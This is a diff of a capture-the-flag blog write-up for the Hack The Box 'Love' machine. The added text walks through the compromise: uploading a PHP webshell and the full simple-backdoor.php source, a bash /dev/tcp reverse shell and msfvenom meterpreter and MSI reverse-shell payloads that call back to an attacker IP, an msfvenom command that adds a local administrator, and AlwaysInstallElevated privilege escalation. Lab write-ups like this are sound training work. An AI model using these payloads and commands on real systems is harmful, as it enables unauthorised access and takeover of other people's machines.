@@ -20,10 +20,10 @@ output: html_document
 ![desc]({{https://jsom1.github.io/}}/_images/htb_love_desc.png){: height="415px" width = 625px"}
 </div>
 
-**Ports/services exploited:** -\\
-**Tools:** -\\
-**Techniques:** SMB enumeration\\
-**Keywords:** -
+**Ports/services exploited:** http\\
+**Tools:** dirb, nmblookup, nbtscan, smbclient, smbmap, enum4linux, msfvenom, multi/handler\\
+**Techniques:** SMB enumeration, SMB file transfer, file inclusion, reverse shell\\
+**Keywords:** webshell, "Always Install Elevated" (PE) 
 
 
 ## 1. Port scanning
@@ -57,14 +57,14 @@ Now we can use the host name:
 ![website]({{https://jsom1.github.io/}}/_images/htb_love_site.png)
 </div>
 
-I tried to submit credentials such as "1/admin", to no avail. Let's use *dirb* to enumerate directories:
+I tried to submit obvious credentials such as "admin/admin", to no avail. Let's use *dirb* to enumerate directories:
 
 <div class="img_container">
 ![dirb]({{https://jsom1.github.io/}}/_images/htb_love_dirb.png)
 </div>
 
 We are not authorized to access most of those directories, but we have access to */admin* and its variations. Browsing at *love.htb/admin*, we see a very similar page to the previous one.\\
-This time however, it requires a username instead of an ID. We obviously try some common credentials (admin/admin) again, but still without luck.\\
+This time however, it requires a username instead of an ID. We once again try some common credentials (admin/admin), but still without luck.\\
 At this point we might be tempted to bruteforce the login with *Hydra*, but it's not necessarily a good idea... The chances of success are relatively low, it can take a lot of time depending on the chosen wordlist and it's not very discrete.
 In the worst case (I doubt it's the case here though), it could get our IP address banned. So, let's look at the other options we have.
 
@@ -131,7 +131,7 @@ That could be interesting later. Even though we find nothing on SMB, let's use a
 ![enum4linux]({{https://jsom1.github.io/}}/_images/htb_love_enum4l.png)
 </div>
 
-Of course it failed early... We get a useful information though: the server doesn't alllow null sessions. Since this latter is often a necessary condition for expoitation, enu4linux aborted the rest of the scan.\\
+Of course it failed early... We get a useful information though: the server doesn't allow null sessions. Since this latter is often a necessary condition for expoitation, enu4linux aborted the rest of the scan.\\
 SMB doesn't look to be our way in... 
 
 Let's get back at the initial nmap scan to figure out our next move. 
@@ -199,7 +199,7 @@ Great, we have credentials! We can go back to *love.htb/admin* and use them here
 ![dashboard]({{https://jsom1.github.io/}}/_images/htb_love_db.png)
 </div>
 
-We land on a dashboard. The menu contains different tabs, but all of them are empty. We see a user called *Neovic Devierte*. When clicking on the username, we see we can update the profile. A menu opens, and we can add a photo. Maybe we can add a file, so let's try to upload our *windows/meterpreter/reverse_tcp* payload. I don't show the output here because it didn't work... Is is because of the "DOS" error w saw earlier?\\
+We land on a dashboard. The menu contains different tabs, but all of them are empty. We see a user called *Neovic Devierte*. When clicking on the username, we see we can update the profile. A menu opens, and we can add a photo. Maybe we can add a file, so let's try to upload our *windows/meterpreter/reverse_tcp* payload. I don't show the output here because it didn't work... Is is because of the "DOS" error we saw earlier?\\
 We can also try to use a webshell from */usr/share/webshells*. Because the application is written in PHP, we'll use */usr/share/webshells/php/php-reverse-shell.php*. We must modify two lines in the code:
 
 ````
@@ -231,16 +231,143 @@ And we upload the file on the server:
 ![revsh fail]({{https://jsom1.github.io/}}/_images/htb_love_revshfail.png)
 </div>
 
-We see the target connected back to us, but the connection closed after an error... I googled this error and landed on a forum. Someone explains it's because uname doesn't exist on Windows, and it's better to use our own php reverse shell, something like the following:
+We see the target connected back to us, but the connection closed after an error... I googled this error and landed on a forum. Someone explains it's because *uname* doesn't exist on Windows, and it's better to use our own php reverse shell, something like the following:
 
 ````
 <?php echo shell_exec($_GET[‘cmd’]).’ 2>&1’); ?>
 ``````
 
+I tried to adapt the previous command to include a bash reverse shell (*$_GET['bash -i >& /dev/tcp/10.10.14.6/4444 0>&1']*), but it didn't work... Maybe we could upload our meterpreter payload file and use a command similar to the previous one to execute it?\\
+Still in */usr/share/webshells/php*, there is another script, *simple-backdoor.php*. Its content is the following:
 
+````
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
 
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+
+<!--    http://michaeldaw.org   2006    -->
+````
+
+Let's try to upload that and see if we can issue commands. The usage says *http://target.com/simple-backdoor.php?cmd=<cmd>*, but it doesn't work. After looking around, I finally found the uploaded a file (and also the other I uploaded):
+
+<div class="img_container">
+![uploaded script]({{https://jsom1.github.io/}}/_images/htb_love_images.png)
+</div>
+ 
+The script works! We see we're in as *phoebe*. At this point we could probably read the *user.txt* flag directly, but we'll need a shell at some point so let's try that instead.\\
+Since we can execute this command, we should also be able to execute a payload to get a reverse shell. The payload we'll use is:
+ 
+````
+ sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f exe -o reverseshell.exe
+`````
+
+We set up Metasploit's multi/handler, upload *reverseshell.exe* on the server and use the backdoor command to execute it:
+
+<div class="img_container">
+![uploaded script]({{https://jsom1.github.io/}}/_images/htb_love_exec.png)
+</div>
+<div class="img_container">
+![uploaded script]({{https://jsom1.github.io/}}/_images/htb_love_revsh.png)
+</div>
+ 
+And finally, after hours of struggling, we've got a shell! I still don't understand how one of the payload I uploaded got executed... Maybe it was another player who did it? I guess I'll never know... Now we can simply grab the flag:
+ 
+<div class="img_container">
+![user flag]({{https://jsom1.github.io/}}/_images/htb_love_user.png)
+</div>
+
+And we're back at enumerating... As usual, the first thing I do is check the user permissions. The Windows equivalent of *sudo -l* is *whoami /priv*:
+
+<div class="img_container">
+![user perms]({{https://jsom1.github.io/}}/_images/htb_love_sudol.png)
+</div>
+ 
+I have already seen this but never exploited it. Let's upload WinPeas on the target. For the sake of exercising, we'll use SMB to transfer it from Kali to Windows.\\
+We'll use the tool *Impacket* (it should be installed, *sudo apt install python-impacket* otherwise) to create an SMB share on our Kali machine, and connect to that share from the compromised Windows host. We will then be able to copy files into the shared folder on either host, and access them on the other host.\\
+The command to start the server is the following:
+ 
+````
+sudo impacket-smbserver <shareName> <sharePath>
+`````
+Sharename can be anything we want, and sharePath is the folder we want to share. In my case, I created a directory *tools* on Kali, and placed *winPEASany.exe* within it. We can then share this directory as follows:
+
+````
+sudo impacket-smbserver smb home/kali/tools
+`````
+
+Then from Windows, we use the *net use* built in command to list the connected shares, and we connect to it. Finally, we can list the files on the share. All those commands are the following:
+ 
+````
+C:\>net use
+C:\>net use \\10.10.14.6\smb
+C:\>dir \\10.10.14.6\smb
+``````
+
+<div class="img_container">
+![share]({{https://jsom1.github.io/}}/_images/htb_love_share.png)
+</div>
+ 
+ 
+We transfer the file:
+ 
+````
+C:\>copy \\10.10.14.6\smb\winPEASany.exe .
+`````
+
+<div class="img_container">
+![copy]({{https://jsom1.github.io/}}/_images/htb_love_copy.png)
+</div>
+
+As the last time I tried on another Windows box, using this script makes our session crash... I have no idea why, and it's annoying because most people on the forum found the PE vector using it... After a bit of manual enumeration, I had to ask for the solution. We're using "Always Install Elevated". I found an article (https://ed4m4s.blog/privilege-escalation/windows/always-install-elevated) and we can check for the vulnerability with the following commands:
+ 
+````
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+``````
+
+The ouput of both commands must be "1" to be exploitable. If it is the case, we have 2 possibilities:
+1) Generate a payload to add user to admin group: *sudo msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f msi-nouac -o setup.msi*
+2) Generate a reverse shell payload: *sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST <IP> LPORT <PORT> -f msi -o reverse.msi*.
+ 
+Let's try the second one:
+ 
+````
+sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST 10.10.14.6 LPORT 5555 -f msi -o reverse.msi
+``````
+
+We upload this file onto the server the same way we uploaded the previous ones and set up a netcat listener on port 5555. We use our backdoor in the browser to execute it:
+ 
+````
+love.htb/images/simple-backdoor.php?cmd=reverse.msi
+`````
+
+If everything works as expected, we should get a reverse shell:
+ 
+<div class="img_container">
+![root]({{https://jsom1.github.io/}}/_images/htb_love_root.png)
+</div>
+
+And we can grab the flag! I don't see the link between "Always Install Elevated" and our payload. I spent too many hours on this machine and don't want to spend more time on it, but I guess it has something to do with executing a *.msi* file. From Google, we see that "MSI is an installer package file format used by Windows. Its name comes from the program's original title, Microsoft Installer, which has since changed to Windows Installer".\\
+That's probably it, it must execute our file with nt\system permissions.
+ 
+<div class="img_container">
+![pwn]({{https://jsom1.github.io/}}/_images/htb_love_pwn.png)
+</div>
 
 <ins>**My thoughts**</ins>
  
-As usual, many rabbit holes. SMB enumeration didn't bring anything useful but was a great opportunity to practice it.
+As usual, I fell into many rabbit holes. However, that was a good opportunity to practice. In particular, it was refreshing to perform a thorough SMB enumeration and use it for file sharing.\\
+I struggled connecting the dots in this box. The image file inclusion "vulnerability" was nice. It's very likely possible to force the uploaded file to have a *.png* or *.jpeg* extension, but fortunately for us it wasn't the case here.
 
